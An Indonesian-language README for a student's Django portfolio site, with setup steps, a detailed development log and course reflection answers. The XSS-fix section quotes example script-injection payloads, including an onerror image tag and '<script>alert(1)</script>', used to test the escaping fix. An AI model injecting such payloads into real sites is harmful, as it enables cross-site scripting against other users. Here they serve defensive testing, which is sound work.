# Portofolio — Bagas Mahendra

Website portofolio pribadi, dibangun pakai Django (Python) untuk backend dan HTML & CSS murni untuk tampilan (tanpa CSS framework). Fokusnya sederhana: tampilin siapa aku, latar belakang, pengalaman, dan tools desain yang biasa aku pakai — dengan data yang dikelola lewat model Django, bukan hardcoded di template.

---

## Fitur

- **Sticky navbar berbentuk pill** yang nge-highlight menu aktif sesuai section/halaman yang sedang dilihat, ini murni pakai CSS selector `:has()` dan `:target`, jadi nggak butuh JavaScript sama sekali buat scroll-spy-nya.
- **Role text yang berganti otomatis** ("Designer", "Computer Science", "Web Developer") ditampilkan lewat *ticker* berjalan (`hero-ticker` / `ticker-track`) yang di-loop tanpa henti pakai CSS `@keyframes` (`translateX(0)` ke `translateX(-50%)`, `animation: tickerMove 72s linear infinite`), dengan konten ticker diduplikasi dua kali biar transisi dari ujung ke ujung terlihat mulus/seamless.
- **Section "About"** dengan bingkai foto ala browser window (dot merah-kuning-hijau) dan info NPM/Program Studi dalam bentuk pill.
- **Section "Experience"** — daftar pengalaman (internship, volunteer, dsb.) yang diambil dari model `Experience`, menampilkan kategori, status (sedang berlangsung/selesai), dan deskripsi tiap pengalaman.
- **Section "Skills"** — kartu skill software desain yang ditumpuk miring kayak kartu remi (skill deck), diambil dari model `Skill`, rapi lagi + sedikit terangkat kalau 
di-hover.
- **Section "Project"** — daftar karya/project yang diambil dari model `Project`, menampilkan kategori, deskripsi, dan link ke demo/repo (jika ada).
- **Fitur CRUD penuh untuk Experience & Project** — data bisa ditambah (create), diubah (edit), dan dihapus (delete) langsung lewat halaman web tanpa masuk Django admin, dengan konfirmasi hapus lewat modal popover native (`popover="auto"`, tanpa JavaScript).
- **Fully responsive** - di layar sempit, skill deck otomatis berubah jadi vertikal dan kartunya nggak dimiringkan lagi.

## Tech Stack

- Django (Python) — routing, view, dan ORM/model untuk data Experience & Skill
- HTML5 semantic markup + Django Template Language
- CSS3 (custom properties / CSS variables, Grid, Flexbox, keyframe animation)
- Google Fonts — *Space Grotesk* & *Anton*
- Tanpa JavaScript custom, tanpa build tool, tanpa CSS framework

## Struktur Proyek

├── static/
│   ├── css/
│   │   └── style.css
│   └── img/
│       ├── Nobackground.png
│       ├── BagasFasilkom.jpeg
│       ├── StarLogo.png
│       ├── PhoneIcon.png
│       ├── PhotoshopLogo.png
│       ├── MarvelousDesignerLogo.png
│       ├── ProcreateLogo.png
│       └── FigmaLogo.png
├── templates/
│       ├── base.html
│       ├── index.html
│       ├── experience.html
│       ├── experience_form.html
│       ├── login.html
│       ├── project.html
│       ├── project_form.html
│       ├── register.html
│       ├── skill.html
│       └── components/
│           ├── toast.html
│           ├── experience_delete_modal.html
│           ├── experience_form_modal.html
│           ├── project_delete_modal.html
│           ├── project_form_modal.html
│           └── project_star.html
└── README.md

## Cara Menjalankan

1. Clone repo ini
   ```bash
   git clone <url-repo-kamu>
   cd <nama-folder>
   ```
2. Buat & aktifkan virtual environment, lalu install dependency:
   ```bash
   python3 -m venv env
   source env/bin/activate
   pip install -r requirements.txt
   ```
3. Jalankan migration supaya skema database (termasuk tabel `Experience` dan `Skill`) sesuai dengan model:
   ```bash
   python manage.py migrate
   ```
4. Pastikan folder `static/img/` sudah berisi semua asset gambar yang dipakai di template.
5. (Opsional) Buat superuser untuk mengisi data Experience & Skill lewat Django admin:
   ```bash
   python manage.py createsuperuser
   ```
6. Jalankan development server:
   ```bash
   python manage.py runserver
   ```
7. Akses di `http://localhost:8000`.

## Progress Pengerjaan

Jujur lagi lagi, aku nggak ngerjain ini dicicil rapi tiap minggu, dikerjain dalam beberapa hari/sesi. Jadi log di bawah ini aku susun per hari & sesi kerja, bukan per minggu, biar lebih mencerminkan proses aslinya.

### Tugas 1

Hari 1

Sesi pagi–siang - Setup struktur HTML dasar (hero, about, skills) dan nentuin color palette dark theme (--accent: #3733e0). Commit awal: kerangka halaman masih polos, belum ada styling detail.
Sesi sore - Riset referensi layout portofolio yang ingin ditiru gayanya, lanjut bangun hero section: grid 2 kolom, mulai eksperimen animasi role text yang bergantian.
Sesi malam - Iterasi animasi role text (benerin timing keyframe yang tadinya numpuk), styling social icons.

Hari 2

Sesi pagi - Bangun about section: frame foto ala browser window (dot merah-kuning-hijau), layout grid buat bio dan meta info (NPM, program studi).
Sesi siang–sore - Bangun skills section dengan efek kartu bertumpuk (skill deck), termasuk hover effect-nya.
Sesi malam - Mulai kejar isu responsive: nemuin skill deck yang patah duluan di layar sempit, mulai eksperimen breakpoint.

Hari 3

Sesi pagi–siang - Selesaikan scroll-spy navbar tanpa JS (kombinasi :target + :has()), finalisasi breakpoint 700px untuk skill deck.
Sesi sore - Polishing keseluruhan: rapihin CSS variable biar konsisten, cek alt text & aksesibilitas dasar, testing di beberapa ukuran layar.
Sesi malam - Final review, commit terakhir sebelum deploy.

### Tugas 2

13 September 2026, aku sempet rombak desain dari yang sebelumnya jadi seperti sekarang. 14 September 2026, sesi jam 3 sore - Menambahkan model `Skill` (dan melengkapi model `Experience`) di `models.py`, membuat migration-nya (`makemigrations` & `migrate`), menambahkan view `show_skill` dan url `skill/` di `main/urls.py`, lalu membangun template `skill.html` yang menarik data dari `Skill.objects.all()` dan ditampilkan lewat skill deck yang sudah ada stylingnya dari Tugas 1. Sekalian menyempurnakan ticker role text di home page supaya loop-nya berjalan tanpa henti (seamless, tanpa jeda/patah saat animasi mengulang).

### Tugas 3

Hari 1

Sesi sore - Sempat kejadian error `NotSupportedError: PostgreSQL 15 or later is required` pas buka halaman `/skill/` di server PWS (Universitas Indonesia), walaupun aman-aman saja di localhost. Setelah ditelusuri, ternyata Django 6.1.1 sudah menghapus dukungan untuk PostgreSQL di bawah versi 15, sementara database yang disediakan PWS masih versi 14.24. Solusinya downgrade `Django==5.1.6` di `requirements.txt` (Django 5.1 masih mendukung PostgreSQL 13+), test ulang di localhost, lalu redeploy ke PWS.

Hari 2

Sesi pagi–siang - Membuat section "Project" baru mengikuti pola arsitektur yang sudah ada di section Experience: menambahkan model `Project` (field `title`, `description`, `category`, `thumbnail`, `project_url`, `created_at`) di `models.py`, `ProjectForm` di `forms.py`, serta view `show_project`, `create_project`, `delete_project`, dan `get_project_json` di `views.py`. Menjalankan `makemigrations` & `migrate` untuk membuat tabel `project` di database.
Sesi sore - Membangun template `project.html`, `project_form.html`, dan `components/project_delete_modal.html`, lalu menambahkan style CSS section Project (`.project-section`, `.project-grid`, `.project-card`, `.project-delete-modal`) mengikuti visual language yang sama dengan Experience.
Sesi malam - Menemukan bug menu navbar "PROJECT" cuma muncul di halaman yang extend `base.html` (seperti Experience), tapi tidak muncul di `index.html` dan `skill.html` karena kedua file itu punya `<nav>` sendiri yang di-hardcode terpisah, bukan warisan dari `base.html`. Diperbaiki dengan menambahkan link "PROJECT" secara manual ke navbar di ketiga file tersebut.

Hari 3

Sesi pagi - Menambahkan fitur edit untuk Experience dan Project. Membuat view `edit_experience` dan `edit_project` yang me-reuse `ExperienceForm`/`ProjectForm` yang sudah ada dengan parameter `instance`, lalu memodifikasi `experience_form.html` dan `project_form.html` supaya satu template bisa menangani mode "tambah" maupun "edit" (judul, action form, dan teks tombol berubah otomatis tergantung ada tidaknya `instance`). Menambahkan tombol "Edit" di tiap card Experience dan Project.

### Tugas 4

Hari 1

Sesi 1 - Membuat autentikasi dasar mengikuti tutorial: menambahkan view `register`, `login_user`, dan `logout_user` di `views.py`, tiga path baru (`register/`, `login/`, `logout/`) di `main/urls.py`, template `register.html` dan `login.html`, serta blok status login di navbar `base.html` (username + Logout kalau sudah login, Login + Register kalau belum). Nilai `name` di kode tutorial masih `"Burhan"`, jadi aku ganti jadi `"Bagas"`. Cookie `last_login` disimpan saat login dan dihapus saat logout.
Sesi 2 - Debugging waktu pertama kali `runserver` setelah semua langkah tutorial selesai. Browser cuma menampilkan `A server error occurred. Please contact the administrator.`, dan setelah dicek di terminal, ternyata errornya `connection to server at "localhost", port 5432 failed: Connection refused`. Bukan kode autentikasinya yang salah, tapi variabel `PRODUCTION` terbaca `True` sehingga `settings.py` mencoba memakai PostgreSQL (dan `DEBUG` otomatis `False`, makanya halaman errornya generik). Setelah `.env` dibenerin jadi `PRODUCTION=False`, proyek balik ke SQLite. Muncul error baru `AttributeError: 'Settings' object has no attribute 'ROOT_URLCONF'` karena baris `ROOT_URLCONF = 'portofolio.urls'` ternyata hilang dari `settings.py`, lalu aku tambahkan lagi. Setelah itu alur register, login, dan logout bisa dicoba dari browser.
Sesi 3 - Menambahkan proteksi view dan fitur star. Memasang `@login_required(login_url="/login/")` pada view yang mengubah data, menambahkan field `starred_by = ManyToManyField(User, related_name="starred_projects", blank=True)` di model `Project` (migrasi `0004_project_starred_by`), membuat komponen `templates/components/project_star.html`, view `toggle_star` (POST + `{% csrf_token %}`), path `projects/<uuid:project_id>/star/`, dan CSS tombol star. Pas tombol star pertama kali ditekan muncul `NoReverseMatch: Reverse for 'show_projects' not found` karena redirect di `toggle_star` memakai nama URL dari tutorial (`show_projects`), sedangkan nama URL di proyekku `show_project`. Di sesi yang sama, `get_project_json` ditambah `use_natural_foreign_keys=True` supaya `starred_by` di `/api/project/` berisi username, bukan id internal database.

Hari 2

Sesi pagi - Menerapkan peran dan otorisasi sesuai spesifikasi Tugas 4. Aku memutuskan menerapkannya di kedua section (Project dan Experience), bukan cuma Project, karena halaman Experience masih menampilkan tombol Tambah, Edit, dan Hapus ke semua pengunjung. Membuat grup `Editor` di Django Admin yang hanya berisi permission `Can change project` dan `Can change experience`, lalu membuat akun uji `keluarga.barak` dan memasukkannya ke grup itu. Pengecekan `is_superuser` di view diganti dengan `@permission_required(..., raise_exception=True)` (ditambah `@require_POST` untuk hapus dan `toggle_star`), dan tombol di template dibungkus `{% if perms.main.add_project %}`, `{% if perms.main.change_project %}`, `{% if perms.main.delete_project %}` beserta padanannya untuk `experience`.
Sesi siang - Testing manual tiap peran. Login sebagai `keluarga.barak` menampilkan tombol Edit dan Star tanpa Tambah dan Hapus, sesuai target, tapi pas Edit ditekan malah muncul 403 padahal Editor seharusnya boleh mengedit. Penyebabnya, view `edit_experience` dan `edit_project` masih punya pengecekan lama `if not request.user.is_superuser: raise PermissionDenied` yang tertinggal dari tahap sebelumnya, jadi permission grup tidak pernah terpakai. Pengecekan itu dihapus dan diganti `@permission_required`. Saat tes sebagai pengunjung, aku sempat dapat 404 di `/projects/add/`, ternyata path yang benar `/project/add/` (tanpa "s"), cuma path star yang memakai `projects/`.
Sesi malam - Merapikan Git sesuai rubrik. Commit awal `autentikasi dan otorisasi` mengumpulkan 13 file sekaligus, jadi pekerjaan berikutnya aku pecah per fitur ke branch terpisah (`feat/authentication`, `feat/project-star`, `feat/roles-permissions`) dengan pesan commit gaya *conventional commits* (`feat(auth): ...`, `fix(settings): ...`, `style(ui): ...`), lalu digabung ke `main` pakai `git merge --no-ff`. Sempat `git push origin main` menjawab `Everything up-to-date` karena commit ternyata masuk ke branch `master` lokal, dan `git pull` juga sempat ditolak karena masih ada perubahan yang belum di-commit. Keduanya beres setelah perubahan yang tertinggal di-commit, lalu sinkronisasi dan push. `.env` dan `db.sqlite3` juga kupastikan nggak ikut ter-commit.

### Tugas 5

Hari 1

Sesi 1 - Membuat komponen toast yang bisa dipakai ulang (templates/components/toast.html + static/js/toast.js), memakai popover="manual" supaya toast selalu tampil di top layer browser tanpa perlu JavaScript tambahan untuk stacking context. Menambahkan CSS toast (.toast-component, .toast-hidden, .toast-show, serta modifier .toast-success/.toast-error/.toast-normal untuk border kiri sesuai tipe notifikasi) ke static/css/style.css. Kode tutorial memakai variabel var(--paper) yang ternyata tidak ada di :root proyekku, jadi diganti 
#242625 (warna latar card gelap yang sudah konsisten dipakai di .experience-card, .skill-card, .project-card) supaya toast menyatu dengan tema dark, bukan transparan. Sesi 2 - Menguji showToast() lewat tombol sementara di project.html sebelum dipasang ke alur AJAX yang sebenarnya, untuk memastikan animasi muncul dari bawah dan hilang otomatis setelah 3 detik sudah benar sebelum lanjut ke bagian yang lebih kompleks.

Hari 2

Sesi pagi - Mengubah project.html dari render server murni ({% for project in project_list %}) menjadi kerangka halaman yang datanya diambil lewat AJAX: menambahkan form pencarian, state loading/error/empty/grid yang disembunyikan/ditampilkan lewat class .hide, dan blok <script> yang memanggil fetch() ke endpoint /api/project/. Fungsi buildProjectCardElement() merakit elemen card dari JSON secara manual. Sesi siang - Menambahkan modal "Tambah Proyek" berbasis popover="auto" (add-project-modal), menggantikan tautan Tambah Proyek yang sebelumnya langsung membuka halaman form terpisah. CSS modal (.project-form-modal, __backdrop, __content, __close, __actions) ditambahkan ke style.css, sekali lagi mengganti var(--paper) dari kode tutorial menjadi 
#242625 dengan alasan yang sama seperti toast. Sesi sore - Debugging beruntun ImportError saat runserver: cannot import name 'show_project', lalu setelah diperbaiki muncul cannot import name 'get_project_json'. Penyebabnya, saat merombak views.py untuk AJAX, nama fungsi sempat berubah (show_project vs show_projects, get_project_json vs get_projects_json) dan tidak konsisten dengan import di main/urls.py, sehingga Python gagal meng-import main.urls sebelum sempat menjalankan server sama sekali. Dibereskan dengan menyamakan nama fungsi persis dengan yang di-import di urls.py, sekaligus merapikan views.py dari import ganda dan sisa pengecekan is_superuser lama di create_project.

Hari 3

Sesi pagi - Membuat create_project_ajax, view baru yang menerima POST dari fetch(), memvalidasi hak akses secara manual (request.user.is_authenticated dan request.user.has_perm("main.add_project")) lalu membalas JsonResponse dengan status code sesuai kondisi: 200 kalau berhasil, 400 dengan form.errors.get_json_data() kalau validasi gagal, 403 kalau tidak punya izin. Sengaja tidak memakai @login_required di view ini karena dekorator itu akan redirect (302) ke halaman login untuk pengguna yang belum login, bukan membalas JSON, sehingga fetch() di sisi klien salah mengira request berhasil padahal isi response-nya HTML halaman login. Sesi siang - Menyambungkan form di dalam modal ke create_project_ajax lewat fetch(): token CSRF diambil dari cookie csrftoken dan dikirim lewat header X-CSRFToken, bukan {% csrf_token %} di dalam body (karena body form dikirim sebagai FormData, bukan form POST biasa). Setelah submit sukses, modal ditutup, toast sukses ditampilkan, dan fetchProjects() dipanggil ulang supaya grid langsung ter-update tanpa reload halaman. Kalau gagal, pesan error dari form.errors ditampilkan lewat toast error. Sesi sore - Menambahkan proteksi XSS. Awalnya buildProjectCardElement() menyisipkan project.title dan project.description langsung ke innerHTML, yang berarti kalau ada yang mengisi judul proyek dengan <script> atau <img src=x onerror=...>, kode itu akan benar-benar dieksekusi browser saat card dirender dari JSON. Ditambahkan fungsi escapeHtml() yang mengubah karakter &, <, >, ", ' jadi HTML entity sebelum disisipkan ke template string, dan dipakai di semua field yang berasal dari input pengguna (title, description, category, url). Di sisi server, ProjectForm dan ExperienceForm ditambahkan clean_title/clean_description yang memanggil strip_tags() sebagai lapisan pertahanan kedua, supaya tag HTML tetap terfilter walau suatu saat ada bagian lain yang lupa melakukan escape saat render. Sesi malam - Menemukan dan memperbaiki bug mismatch data star: script awal membaca project.starred_by sebagai array natural key ([["username"]]) mengikuti pola use_natural_foreign_keys=True dari Tugas 4, padahal get_project_json versi AJAX (yang dibangun manual dengan JsonResponse, bukan serializers.serialize) sebenarnya mengirim field star_count, is_starred, dan starred_by_names secara langsung. Akibatnya tombol Star selalu menampilkan angka 0 meski project sudah pernah di-star. Diperbaiki dengan menyamakan nama field yang dibaca JavaScript dengan yang benar-benar dikirim backend.

Hari 4

Sesi pagi - Menerapkan pola yang sama persis ke section Experience: experience.html diubah jadi AJAX (form pencarian + debounce + fetch), templates/components/experience_form_modal.html dibuat mengikuti struktur project_form_modal.html, get_experience_json diganti dari serializers.serialize menjadi JsonResponse manual supaya category_display (hasil get_category_display()) dan is_ongoing (property model) ikut terkirim — dua nilai itu tidak bisa diambil lewat serializer bawaan karena bukan field mentah. create_experience_ajax dibuat sebagai kembaran create_project_ajax, dan ExperienceForm ditambahkan clean_title/clean_description yang sebelumnya cuma ada di ProjectForm. Sesi siang - Testing menyeluruh di browser: cek .hide benar-benar ada di style.css (karena seluruh logika displayPageSection() bergantung pada class ini untuk menyembunyikan/menampilkan state loading, error, empty, dan grid), mencoba pencarian dengan debounce di kedua halaman, submit form valid dan tidak valid, serta memasukkan payload <script>alert(1)</script> di judul proyek untuk memastikan XSS benar-benar tercegah (tampil sebagai teks biasa, bukan dieksekusi) sebelum dianggap selesai.

## Pertanyaan Reflektif

### Tugas 1

1. Iya, aku pakai beberapa elemen semantik HTML5, tapi nggak semuanya. Struktur utamanya pakai `<header>`, `<main>`, tiga buah `<section>` (hero/profile, about, skills), `<nav>` untuk navbar, dan `<footer>`. Aku sengaja pilih `<section>` untuk tiap bagian utama karena masing-masing punya topik sendiri (identitas, tentang aku, skill) dan bisa dirujuk lewat anchor `#profile`, `#about`, `#skills`, jadi selain semantik, ini juga fungsional buat trik scroll-spy CSS yang aku bikin pakai `:target`.

   Yang *nggak* aku pakai adalah `<article>` dan `<aside>`. Aku nggak pakai `<article>` karena nggak ada konten yang sifatnya independen dan bisa berdiri sendiri kalau dipisah dari halaman, kartu skill di section Skills sekilas kelihatan kandidat, tapi isinya cuma nama software + deskripsi singkat, bukan konten "utuh" seperti sebuah post blog atau berita. Aku juga nggak pakai `<aside>` karena nggak ada konten tangensial/pelengkap semacam sidebar atau catatan terkait, semua yang ada di halaman ini memang konten inti portofolio, jadi maksa masukin `<aside>` justru bakal terasa dipaksakan cuma demi "kelihatan semantik", bukan karena benar-benar butuh.

2. Tantangan terbesarnya ada di efek "skill deck", kartu skill yang ditumpuk miring pakai `margin-left: -3rem` dan `transform: rotate(var(--rot))`. Efek ini enak dilihat di layar lebar, tapi begitu viewport mengecil, kartu-kartunya numpuk parah dan rotasinya bikin teks di dalam kartu kepotong/susah dibaca. Ini beda karakter dari masalah responsive pada umumnya (biasanya soal ukuran font atau jumlah kolom), di sini akar masalahnya di transform dan negative margin yang memang didesain untuk layar lebar.

   Cara aku evaluasi: resize browser pelan-pelan dari lebar penuh sampai ukuran HP sambil lihat elemen mana yang "pecah" duluan. Skill deck ternyata patah paling awal, jauh sebelum grid dua kolom di hero/about mulai sempit. Karena itu aku prioritaskan breakpoint eksplisit di `max-width: 700px` khusus untuk `.skill-card` dan `.skill-deck`, rotasi di-reset ke `0deg`, margin negatif dihapus, dan layout diubah jadi satu kolom (`flex-direction: column`).

   Untuk grid di hero dan about section, aku lebih mengandalkan unit fluid seperti `fr` di `grid-template-columns` dan `clamp()` di font-size (misalnya `clamp(3.2rem, 6vw, 4.6rem)` untuk heading), jadi ukuran teks otomatis menyesuaikan lebar layar tanpa breakpoint eksplisit. Ini cukup membantu, tapi belum sempurna aku sadar di layar yang sangat sempit (di bawah kira-kira 480px), `.hero-grid` dan `.about-grid` masih tetap dua kolom karena belum aku pecah jadi satu kolom secara eksplisit. Ini jadi salah satu titik yang masih perlu breakpoint tambahan.

3. Karena ini static web murni tanpa server-side apa pun, batasan paling kerasa ada di dua hal: pertama, kontak cuma bisa lewat link `mailto:`, yang bikin pengunjung harus buka aplikasi email mereka sendiri, nggak ada form kontak beneran yang bisa langsung mengirim pesan dari halaman, karena itu butuh proses di server untuk handle submission-nya. Kedua, semua konten (bio, daftar skill, foto) itu hardcoded langsung di `index.html` — setiap kali mau update sesuatu, aku harus edit HTML dan re-deploy, tidak ada cara mengubah konten tanpa menyentuh kode.

   Untuk iterasi selanjutnya, dua fungsionalitas dinamis yang paling ingin aku siapkan: (1) form kontak fungsional (misalnya lewat layanan seperti Formspree, atau backend kecil sendiri) supaya pengunjung bisa langsung mengirim pesan tanpa pindah aplikasi, dan (2) section proyek yang datanya diambil dari file data terpisah (JSON) atau headless CMS ringan, supaya aku bisa menambah proyek baru tanpa perlu mengubah struktur HTML setiap kali.

### Tugas 2

1. Alur yang terjadi ketika pengguna membuka halaman skill baru (`/skill/`), dari request diterima sampai data ditampilkan di browser, adalah sebagai berikut:

   - **`urls.py` proyek** (`portofolio/urls.py`) adalah titik masuk pertama semua request. Django mencocokkan path `/skill/` ke pola yang ada di `urlpatterns`; karena tidak ada yang cocok langsung, request diteruskan lewat `include("main.urls")` ke level aplikasi:
     ```python
     path("", include("main.urls")),
     ```
   - **`urls.py` aplikasi** (`main/urls.py`) adalah tempat path spesifik `/skill/` dicocokkan ke view yang bersangkutan:
     ```python
     path("skill/", show_skill, name="show_skill"),
     ```
     Django kemudian memanggil fungsi `show_skill` di `main/views.py`. `app_name = "main"` juga yang membuat `{% url 'main:show_skill' %}` di template bisa dipakai untuk generate link tanpa hardcode path.
   - **View** (`show_skill` di `main/views.py`) adalah "otak" dari request ini. Fungsi ini melakukan query semua data skill dari database lewat ORM:
     ```python
     "skill_list": Skill.objects.all(),
     ```
     Hasil query (queryset) dimasukkan ke dictionary `context` bersama `name`, lalu view memanggil `render()` yang menggabungkan `context` tersebut dengan template `skill.html`.
   - **Model** (`Skill` di `main/models.py`) mendefinisikan struktur data yang di-query di langkah sebelumnya: field `name`, `description`, `logo`, dst. `Skill.objects.all()` diterjemahkan ORM menjadi query SQL ke database, dan hasil baris-baris tabel diubah menjadi objek-objek Python (instance `Skill`) yang atributnya bisa diakses di template.
   - **Template** (`skill.html`) menerima `context` dari view, lalu `{% for skill in skill_list %}` melakukan looping tiap objek `Skill` dan me-render `.skill-card` per item — `{{ skill.name }}`, `{{ skill.description }}`, `{{ skill.logo }}` diambil langsung dari atribut objek model yang dikirim view. Hasil akhirnya berupa HTML yang dikirim balik sebagai response ke browser pengunjung.

   Ringkasnya: **project `urls.py`** berperan sebagai gerbang/router utama → **app `urls.py`** memetakan path ke view spesifik → **view** mengambil data lewat model dan menentukan template mana yang dipakai → **model** mendefinisikan struktur data sekaligus menjadi jembatan ke database → **template** menjadi lapisan presentasi akhir ke pengunjung.

2. Karena secara arsitektur MVT, template itu murni layer presentasi — tugasnya menampilkan data, bukan menyimpan data. Kalau daftar skill di-hardcode langsung di `skill.html` (misal pakai `<div>` manual satu-satu per software), setiap kali mau menambah/mengubah/menghapus skill, aku harus mengedit file HTML yang isinya campur aduk dengan markup, gampang salah menaruh tag, dan tidak ada validasi tipe data sama sekali.

   Dengan disimpan di model (seperti yang sekarang dilakukan lewat `skill_list` yang di-loop pakai `{% for skill in skill_list %}`), dampaknya:
   - **Single source of truth** — data skill ada di satu tempat (database), bukan tersebar di kode template.
   - **Bisa diubah tanpa menyentuh kode** — lewat Django admin, menambah skill baru tinggal input form, tidak perlu re-deploy.
   - **Separation of concerns** — model mengurus data & struktur (nama, deskripsi, logo), view mengurus logic pengambilan data, template mengurus tampilan. Ini membuat masing-masing bagian lebih mudah di-maintain dan di-debug secara independen.
   - **Query-able** — bisa difilter/diurutkan/dibatasi lewat ORM (misalnya mengurutkan skill berdasarkan tanggal ditambahkan), sesuatu yang tidak mungkin dilakukan kalau datanya statis di HTML.

3. Perbedaan `makemigrations` dan `migrate`:

   - `makemigrations` membaca perubahan yang dibuat di `models.py` (dibandingkan migration terakhir yang tercatat), lalu **menghasilkan file migration baru** di folder `migrations/` berisi instruksi perubahan skema. Di tahap ini, database belum berubah sama sekali — ini baru "rencana"-nya.
   - `migrate` **menerapkan** file-file migration yang ada (termasuk yang baru dibuat) ke database beneran, sehingga skema tabel di database benar-benar berubah.

   Contoh konkret dari proyek ini: saat menambahkan field baru, misalnya `logo` di model `Skill` (supaya bisa menampilkan `skill.logo` di `skill-card`), alurnya:
   1. Edit `models.py`, tambahkan field `logo` di class `Skill`.
   2. Jalankan `python manage.py makemigrations` → Django mendeteksi ada field baru, menghasilkan file migration (misal `0002_skill_logo.py`) yang isinya operasi `AddField`.
   3. Jalankan `python manage.py migrate` → migration tersebut diterapkan, kolom `logo` benar-benar ditambahkan ke tabel `skill` di database.

   Kalau hanya menjalankan `makemigrations` tanpa `migrate`, kode Python sudah "tahu" ada field baru tapi database-nya belum punya kolomnya — akan error saat diakses.

### Tugas 3

1. Kita memakai `ModelForm` (seperti `ExperienceForm` dan `ProjectForm` di proyek ini) alih-alih membuat form HTML manual karena `ModelForm` otomatis men-generate field form berdasarkan field yang ada di model (`Experience`, `Project`), lengkap dengan validasi tipe data bawaan Django — misalnya `URLField` otomatis memvalidasi bahwa yang diisi memang format URL yang benar, tanpa aku perlu menulis validasi manual. Kalau pakai HTML form manual, aku harus menulis ulang `<input>` untuk tiap field, menjaga nama field tetap sinkron dengan model secara manual, dan menulis validasi sendiri di view — rawan error dan duplikasi kerja karena struktur field sebenarnya sudah didefinisikan sekali di `models.py`.

   `{% csrf_token %}` wajib ditambahkan pada form karena Django menerapkan proteksi CSRF (Cross-Site Request Forgery) secara default untuk semua request yang mengubah data (POST, PUT, DELETE). Tag ini menyisipkan token unik dan tersembunyi di form yang hanya valid untuk sesi pengguna tersebut; saat form di-submit, Django mencocokkan token itu dengan yang tersimpan di sisi server. Tanpa token ini, form submission akan ditolak (403 Forbidden), karena Django tidak bisa memastikan bahwa request tersebut memang berasal dari form yang di-render oleh server kita sendiri, bukan dari situs jahat yang menipu browser pengguna untuk mengirim request atas nama mereka tanpa sepengetahuan mereka.

2. JSON lebih disukai dibanding XML dalam pengembangan aplikasi web modern karena beberapa alasan. Pertama, **sintaks JSON jauh lebih ringkas** — tidak ada closing tag berulang seperti XML (`<title>...</title>` vs cukup `"title": "..."`), sehingga ukuran payload lebih kecil dan lebih hemat bandwidth, terutama penting untuk API yang dipanggil berkali-kali seperti `get_experience_json` dan `get_project_json` di proyek ini. Kedua, **JSON native di JavaScript** — karena JSON pada dasarnya adalah subset dari object literal JavaScript, browser bisa langsung mem-parsing JSON jadi object JavaScript tanpa library tambahan (`JSON.parse()`), sementara XML butuh proses parsing DOM yang lebih rumit (`DOMParser`, XPath, dsb). Ketiga, **lebih mudah dibaca manusia** dan strukturnya (object, array, key-value) lebih natural memetakan ke struktur data pada hampir semua bahasa pemrograman modern, dibanding XML yang punya konsep tambahan seperti attribute vs element yang kadang ambigu dipakai untuk apa.

3. Alur yang terjadi saat fungsi view mengembalikan data portofolio dalam bentuk JSON (contoh: `get_experience_json` di `main/views.py`) adalah sebagai berikut:
   - View mengambil data dari database lewat ORM: `Experience.objects.all()`, yang menghasilkan **queryset** — kumpulan objek Python instance dari model `Experience`, bukan format data yang bisa langsung dikirim lewat HTTP.
   - Data queryset tersebut lalu diproses lewat `serializers.serialize("json", experience_list)`. Fungsi `serialize` inilah yang melakukan **serialization**: mengubah objek Python (instance model, yang punya method, relasi ke database, dan tipe data Python seperti `datetime` atau `UUID`) menjadi representasi string JSON — format teks universal yang bisa dikirim lewat jaringan dan dipahami sistem lain yang mungkin sama sekali tidak menjalankan Python/Django.
   - Hasil string JSON tersebut dibungkus dalam `HttpResponse` dengan `content_type="application/json"`, lalu dikirim sebagai response HTTP ke client.

   Proses serialization ini **wajib** dilakukan karena objek model Django bukan format data yang portable — objek Python punya referensi memori, method, relasi foreign key, dan tipe data spesifik Python (seperti `UUID` object atau `datetime` object) yang tidak bisa langsung "dimengerti" oleh format transport seperti HTTP body yang cuma berupa teks/bytes. Serialization menjembatani ini dengan mengonversi objek kompleks tersebut menjadi format data sederhana dan universal (string JSON) yang bisa di-decode kembali oleh sistem apapun di sisi penerima — baik itu browser dengan JavaScript, aplikasi mobile, atau bahkan server lain yang sama sekali tidak ditulis dengan Python.

### Tugas 5
1. Debouncing adalah teknik menunda eksekusi sebuah fungsi sampai pengguna "berhenti" memicu event tertentu selama jangka waktu tertentu, dan kalau event itu terpicu lagi sebelum waktunya habis, timer-nya di-reset dari awal. Di fitur pencarian proyekku, ini diterapkan lewat setTimeout + clearTimeout:
javascript
   searchInput.addEventListener("input", function() {
       clearTimeout(searchDebounceTimer);
       searchDebounceTimer = setTimeout(function() {
           searchProjects();
       }, SEARCH_DEBOUNCE_DELAY);
   });

Setiap kali pengguna mengetik satu huruf, timer lama dibatalkan dan timer baru dipasang; fetchProjects() baru benar-benar dipanggil kalau tidak ada ketikan baru selama 300ms.

Teknik ini penting diterapkan pada pencarian berbasis AJAX karena tanpanya, setiap satu huruf yang diketik akan langsung memicu satu request fetch() baru ke server. Mengetik kata "project" saja (7 huruf) berarti 7 request terpisah dalam hitungan detik, padahal yang relevan buat pengguna cuma hasil pencarian dari kata lengkap yang mereka maksud. Dampaknya tanpa debouncing: beban server jadi tidak perlu (query database dijalankan berkali-kali untuk hasil yang langsung dibuang), bandwidth terbuang, dan yang paling kerasa di sisi pengguna adalah race condition — karena request-request itu dikirim hampir bersamaan tapi responsnya bisa datang tidak berurutan (request untuk "proj" bisa saja baru selesai setelah request untuk "project"), sehingga grid yang ditampilkan bisa jadi hasil pencarian kata yang sudah tidak relevan lagi. Di kodeku, race condition semacam ini juga dijaga lapis kedua lewat AbortController (projectsAbortController.abort()) yang membatalkan request lama begitu ada request baru, jadi debouncing dan abort saling melengkapi: debouncing mengurangi jumlah request yang dikirim, abort memastikan kalaupun ada request lama yang terlanjur jalan, hasilnya tidak dipakai.

2. await dipakai di depan fetch() untuk "menjeda" eksekusi fungsi async sampai Promise yang dikembalikan fetch() selesai (resolve), lalu nilai hasilnya (objek Response) baru dilanjutkan ke baris berikutnya — tanpa memblokir thread utama browser sama sekali, karena await hanya menjeda fungsi async itu sendiri, bukan seluruh JavaScript runtime. Di proyekku:
javascript
   const response = await fetch(url, { ... });
   if (!response.ok) throw new Error('Failed to fetch data');
   const projectData = await response.json();

await yang pertama menunggu response HTTP selesai diterima (header dan status code sudah sampai), dan await kedua menunggu body response-nya selesai di-parse jadi objek JavaScript (karena response.json() sendiri juga asynchronous, body-nya bisa jadi belum sepenuhnya diterima saat baris itu dijalankan).

